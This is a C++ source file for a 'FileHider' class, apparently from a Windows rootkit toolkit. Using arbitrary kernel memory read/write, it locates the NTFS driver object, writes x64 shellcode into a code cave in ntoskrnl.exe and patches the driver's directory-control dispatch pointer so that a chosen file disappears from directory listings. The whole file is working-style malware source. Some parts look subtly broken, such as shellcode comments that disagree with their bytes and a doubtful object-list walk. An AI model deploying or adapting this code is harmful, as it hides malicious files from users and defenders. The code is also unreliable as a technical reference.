/**
 * @file FileHider.cpp
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the implementation of the FileHider class.
 *
 * Implements the robust logic for finding the NTFS driver object, locating a
 * code cave, injecting shellcode to filter directory queries, and patching the
 * driver's MajorFunction table to activate the hook.
 */

#include "FileHider.h"
#include "Utils.h"
#include <iostream>
#include <winternl.h>
#include <vector>
#include <Windows.h>
#include <ntddkbd.h>
#include <memory>
#include <string>
#include <cstring>
#include <algorithm>

// Forward declarations and constants
#define IRP_MJ_DIRECTORY_CONTROL 0x0C

// Missing Windows types
typedef SHORT CSHORT;
typedef struct _IO_TIMER *PIO_TIMER;
typedef ULONG DEVICE_TYPE;

// Forward declare structures to avoid circular dependencies
typedef struct _DEVICE_OBJECT DEVICE_OBJECT, *PDEVICE_OBJECT;
typedef struct _DRIVER_OBJECT DRIVER_OBJECT, *PDRIVER_OBJECT;
typedef struct _DRIVER_EXTENSION DRIVER_EXTENSION, *PDRIVER_EXTENSION;
typedef struct _FAST_IO_DISPATCH FAST_IO_DISPATCH, *PFAST_IO_DISPATCH;
typedef struct _IRP IRP, *PIRP;

// Undocumented structures needed for DRIVER_OBJECT enumeration
typedef struct _OBJECT_HEADER {
    LONG PointerCount;
    union {
        LONG HandleCount;
        PVOID NextToFree;
    };
    struct _OBJECT_TYPE* Type;  // Fixed: properly declare Type field
    UCHAR NameInfoOffset;
    UCHAR HandleInfoOffset;
    UCHAR QuotaInfoOffset;
    UCHAR Flags;
} OBJECT_HEADER, *POBJECT_HEADER;

typedef struct _OBJECT_TYPE {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    // ... other fields
} OBJECT_TYPE, *POBJECT_TYPE;

// Kernel driver object structure
typedef struct _DRIVER_OBJECT {
    CSHORT Type;
    CSHORT Size;
    PDEVICE_OBJECT DeviceObject;
    ULONG Flags;
    PVOID DriverStart;
    ULONG DriverSize;
    PVOID DriverSection;
    PDRIVER_EXTENSION DriverExtension;
    UNICODE_STRING DriverName;
    PUNICODE_STRING HardwareDatabase;
    PFAST_IO_DISPATCH FastIoDispatch;
    PVOID DriverInit;
    PVOID DriverStartIo;
    PVOID DriverUnload;
    PVOID MajorFunction[28];  // IRP_MJ_MAXIMUM_FUNCTION + 1
} DRIVER_OBJECT, *PDRIVER_OBJECT;

// Device object structure (simplified)
typedef struct _DEVICE_OBJECT {
    CSHORT Type;
    USHORT Size;
    LONG ReferenceCount;
    PDRIVER_OBJECT DriverObject;
    PDEVICE_OBJECT NextDevice;
    PDEVICE_OBJECT AttachedDevice;
    PIRP CurrentIrp;
    PIO_TIMER Timer;
    ULONG Flags;
    ULONG Characteristics;
    PVOID Vpb;
    PVOID DeviceExtension;
    DEVICE_TYPE DeviceType;
    CCHAR StackSize;
    // ... other fields
} DEVICE_OBJECT, *PDEVICE_OBJECT;

// Driver extension structure (simplified)
typedef struct _DRIVER_EXTENSION {
    PDRIVER_OBJECT DriverObject;
    PVOID AddDevice;
    ULONG Count;
    UNICODE_STRING ServiceKeyName;
} DRIVER_EXTENSION, *PDRIVER_EXTENSION;

// Structure for directory enumeration results
typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;


// Complete x64 shellcode to filter IRP_MJ_DIRECTORY_CONTROL. This is a post-operation hook.
static const unsigned char g_FileHidingShellcode[] = {
    0x55,                                           // push rbp
    0x48, 0x89, 0xE5,                               // mov rbp, rsp
    0x41, 0x57,                                     // push r15
    0x41, 0x56,                                     // push r14
    0x41, 0x55,                                     // push r13
    0x41, 0x54,                                     // push r12
    0x53,                                           // push rbx
    0x56,                                           // push rsi
    0x57,                                           // push rdi
    0x48, 0x83, 0xEC, 0x30,                         // sub rsp, 30h
    0x48, 0x8B, 0xCA,                               // mov rcx, rdx ; IRP
    0x48, 0x8B, 0x51, 0x60,                         // mov rdx, [rcx+60h] ; IoStackLocation
    0x48, 0x8B, 0x42, 0x18,                         // mov rax, [rdx+18h] ; FileInformationClass
    0x83, 0xF8, 0x25,                               // cmp eax, 37 ; FileIdBothDirectoryInformation
    0x75, 0x6A,                                     // jne call_original
    0x48, 0x8D, 0x4D, 0x80,                         // lea rcx, [rbp-80h] ; shellcode address
    0x48, 0x83, 0xC1, 0x90,                         // add rcx, 90h ; params address (fixed)
    0x48, 0x8B, 0x01,                               // mov rax, [rcx] ; OriginalFunction
    0x48, 0x8B, 0xD0,                               // mov rdx, rax
    0x48, 0x8B, 0xCB,                               // mov rcx, rbx
    0xFF, 0xD2,                                     // call rdx
    0x49, 0x89, 0xC7,                               // mov r15, rax ; save status
    0x41, 0x83, 0xFF, 0x00,                         // cmp r15d, 0
    0x75, 0x4C,                                     // jne cleanup
    0x48, 0x8B, 0x4B, 0x18,                         // mov rcx, [rbx+18h] ; IRP->UserBuffer
    0x48, 0x31, 0xD2,                               // xor rdx, rdx ; previous_entry = NULL
    // loop_start:
    0x48, 0x85, 0xC9,                               // test rcx, rcx
    0x74, 0x3E,                                     // je cleanup
    0x48, 0x8B, 0x71, 0x3C,                         // mov rsi, [rcx+3Ch] ; FileNameLength
    0x48, 0x8D, 0x79, 0x5E,                         // lea rdi, [rcx+5Eh] ; &FileName
    0x48, 0x8D, 0x55, 0x88,                         // lea rdx, [rbp-78h] ; &FileNameToHide
    0xF3, 0x48, 0xA6,                               // repe cmpsb
    0x74, 0x1A,                                     // je found_match
    // not_a_match:
    0x48, 0x89, 0xCA,                               // mov rdx, rcx
    0x8B, 0x09,                                     // mov ecx, [rcx]
    0x85, 0xC9,                                     // test ecx, ecx
    0x74, 0x26,                                     // je cleanup
    0x48, 0x01, 0xCA,                               // add rdx, rcx
    0x48, 0x8B, 0xCA,                               // mov rcx, rdx
    0xEB, 0xD8,                                     // jmp loop_start
    // found_match:
    0x48, 0x85, 0xD2,                               // test rdx, rdx
    0x74, 0x0E,                                     // je first_entry_match
    0x8B, 0x01,                                     // mov eax, [rcx]
    0x01, 0x02,                                     // add [rdx], eax
    0x48, 0x8B, 0xCA,                               // mov rcx, rdx
    0xEB, 0xC4,                                     // jmp not_a_match
    // first_entry_match:
    0x48, 0x8B, 0x43, 0x18,                         // mov rax, [rbx+18h]
    0x8B, 0x09,                                     // mov ecx, [rcx]
    0x48, 0x01, 0xC8,                               // add rax, rcx
    0x48, 0x89, 0x43, 0x18,                         // mov [rbx+18h], rax
    0xEB, 0xB8,                                     // jmp not_a_match
    // cleanup:
    0x4C, 0x89, 0xF8,                               // mov rax, r15
    0x48, 0x83, 0xC4, 0x30,                         // add rsp, 30h
    0x5F,                                           // pop rdi
    0x5E,                                           // pop rsi
    0x5B,                                           // pop rbx
    0x41, 0x5C,                                     // pop r12
    0x41, 0x5D,                                     // pop r13
    0x41, 0x5E,                                     // pop r14
    0x41, 0x5F,                                     // pop r15
    0x48, 0x89, 0xEC,                               // mov rsp, rbp
    0x5D,                                           // pop rbp
    0xC3                                            // ret
};

// Size constant for the shellcode
static const size_t SHELLCODE_SIZE = sizeof(g_FileHidingShellcode);

namespace KernelMode {

    FileHider::FileHider(std::shared_ptr<Providers::IProvider> provider)
        : provider(std::move(provider)), ntfsDriverObject(0), originalDirectoryControl(0), hookAddress(0) {}

    FileHider::~FileHider() {
        if (originalDirectoryControl != 0) {
            UnhideFile();
        }
    }

    uintptr_t FileHider::FindDriverObject(const std::wstring& driverName) {
        uintptr_t ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) return 0;

        uintptr_t pIoDriverObjectType = Utils::GetKernelExport(ntoskrnlBase, "IoDriverObjectType");
        if (!pIoDriverObjectType) return 0;

        uintptr_t ioDriverObjectTypeAddr = 0;
        if (!provider->ReadKernelMemory(pIoDriverObjectType, ioDriverObjectTypeAddr)) return 0;

        LIST_ENTRY typeListHead{};
        if (!provider->ReadKernelMemory(ioDriverObjectTypeAddr + offsetof(OBJECT_TYPE, TypeList), typeListHead)) return 0;

        uintptr_t currentEntryAddr = (uintptr_t)typeListHead.Flink;
        uintptr_t listHeadAddr = ioDriverObjectTypeAddr + offsetof(OBJECT_TYPE, TypeList);

        while (currentEntryAddr != listHeadAddr) {
            uintptr_t objectHeaderAddr = currentEntryAddr - offsetof(OBJECT_TYPE, TypeList) - offsetof(OBJECT_HEADER, Type);
            uintptr_t driverObjectAddr = objectHeaderAddr + sizeof(OBJECT_HEADER);
            
            UNICODE_STRING currentDriverName{};
            if (provider->ReadKernelMemory(driverObjectAddr + offsetof(DRIVER_OBJECT, DriverName), currentDriverName)) {
                if (currentDriverName.Buffer && currentDriverName.Length > 0) {
                    std::vector<wchar_t> buffer(currentDriverName.Length / sizeof(wchar_t) + 1, 0);
                    if (provider->ReadKernelMemory((uintptr_t)currentDriverName.Buffer, buffer.data(), currentDriverName.Length)) {
                        if (_wcsicmp(buffer.data(), driverName.c_str()) == 0) {
                            this->ntfsDriverObject = driverObjectAddr;
                            return driverObjectAddr;
                        }
                    }
                }
            }
            
            LIST_ENTRY next{};
            if (!provider->ReadKernelMemory(currentEntryAddr, next)) break;
            currentEntryAddr = (uintptr_t)next.Flink;
        }

        return 0;
    }

    uintptr_t FileHider::FindCodeCave(uintptr_t moduleBase, size_t caveSize) {
        IMAGE_DOS_HEADER dosHeader{};
        if (!provider->ReadKernelMemory(moduleBase, dosHeader)) return 0;
        IMAGE_NT_HEADERS64 ntHeaders{};
        if (!provider->ReadKernelMemory(moduleBase + dosHeader.e_lfanew, ntHeaders)) return 0;

        uintptr_t sectionHeaderAddr = moduleBase + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
        for (WORD i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
            IMAGE_SECTION_HEADER sectionHeader{};
            if (!provider->ReadKernelMemory(sectionHeaderAddr + i * sizeof(IMAGE_SECTION_HEADER), sectionHeader)) continue;

            if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader.Characteristics & IMAGE_SCN_CNT_CODE)) {
                std::vector<char> sectionData(sectionHeader.Misc.VirtualSize);
                if (!provider->ReadKernelMemory(moduleBase + sectionHeader.VirtualAddress, sectionData.data(), sectionHeader.Misc.VirtualSize)) continue;

                size_t consecutiveNulls = 0;
                for (size_t j = 0; j < sectionData.size(); ++j) {
                    if (sectionData[j] == (char)0x00 || sectionData[j] == (char)0xCC) {
                        consecutiveNulls++;
                    } else {
                        consecutiveNulls = 0;
                    }
                    if (consecutiveNulls >= caveSize) {
                        return moduleBase + sectionHeader.VirtualAddress + j - caveSize + 1;
                    }
                }
            }
        }
        return 0;
    }

    bool FileHider::HideFile(const std::wstring& fileName) {
        if (!provider) return false;
        if (originalDirectoryControl != 0) {
            std::wcerr << L"[-] A file is already hidden. Please unhide first." << std::endl;
            return false;
        }

        std::wcout << L"[*] Attempting to hide file: " << fileName << std::endl;

        if (FindDriverObject(L"\\FileSystem\\Ntfs") == 0) {
            std::wcerr << L"[-] Failed to find NTFS DRIVER_OBJECT." << std::endl;
            return false;
        }
        std::wcout << L"[+] Found NTFS DRIVER_OBJECT at: 0x" << std::hex << this->ntfsDriverObject << std::endl;

        size_t totalHookSize = SHELLCODE_SIZE + sizeof(HOOK_PARAMS);
        uintptr_t ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
        hookAddress = FindCodeCave(ntoskrnlBase, totalHookSize);
        if (!hookAddress) {
            std::wcerr << L"[-] Failed to find a suitable code cave in ntoskrnl.exe." << std::endl;
            return false;
        }
        std::wcout << L"[+] Found code cave at: 0x" << std::hex << hookAddress << std::endl;

        uintptr_t directoryControlPtrAddr = ntfsDriverObject + offsetof(DRIVER_OBJECT, MajorFunction) + (IRP_MJ_DIRECTORY_CONTROL * sizeof(uintptr_t));
        if (!provider->ReadKernelMemory(directoryControlPtrAddr, originalDirectoryControl)) {
            std::wcerr << L"[-] Failed to read original IRP_MJ_DIRECTORY_CONTROL pointer." << std::endl;
            return false;
        }

        HOOK_PARAMS params{};
        params.OriginalFunction = originalDirectoryControl;
        wcsncpy_s(params.FileNameToHide, fileName.c_str(), _TRUNCATE);

        std::vector<char> hookBuffer(totalHookSize);
        memcpy(hookBuffer.data(), g_FileHidingShellcode, SHELLCODE_SIZE);
        memcpy(hookBuffer.data() + SHELLCODE_SIZE, &params, sizeof(HOOK_PARAMS));

        if (!provider->WriteKernelMemory(hookAddress, hookBuffer.data(), hookBuffer.size())) {
            std::wcerr << L"[-] Failed to write hook to code cave." << std::endl;
            return false;
        }

        uintptr_t shellcodeEntry = hookAddress;
        if (!provider->WriteKernelMemory(directoryControlPtrAddr, shellcodeEntry)) {
            std::wcerr << L"[-] Failed to patch IRP_MJ_DIRECTORY_CONTROL." << std::endl;
            UnhideFile();
            return false;
        }

        std::wcout << L"[+] File hiding hook placed successfully." << std::endl;
        return true;
    }

    bool FileHider::UnhideFile() {
        if (originalDirectoryControl == 0) {
            std::wcerr << L"[-] No file hiding hook is currently active." << std::endl;
            return false;
        }

        uintptr_t directoryControlPtrAddr = ntfsDriverObject + offsetof(DRIVER_OBJECT, MajorFunction) + (IRP_MJ_DIRECTORY_CONTROL * sizeof(uintptr_t));

        if (!provider->WriteKernelMemory(directoryControlPtrAddr, originalDirectoryControl)) {
            std::wcerr << L"[-] Failed to restore original IRP_MJ_DIRECTORY_CONTROL pointer." << std::endl;
            return false;
        }

        size_t totalHookSize = SHELLCODE_SIZE + sizeof(HOOK_PARAMS);
        std::vector<char> zeros(totalHookSize, 0);
        provider->WriteKernelMemory(hookAddress, zeros.data(), zeros.size());

        std::wcout << L"[+] File hiding hook removed successfully." << std::endl;
        originalDirectoryControl = 0;
        hookAddress = 0;
        ntfsDriverObject = 0;
        return true;
    }
}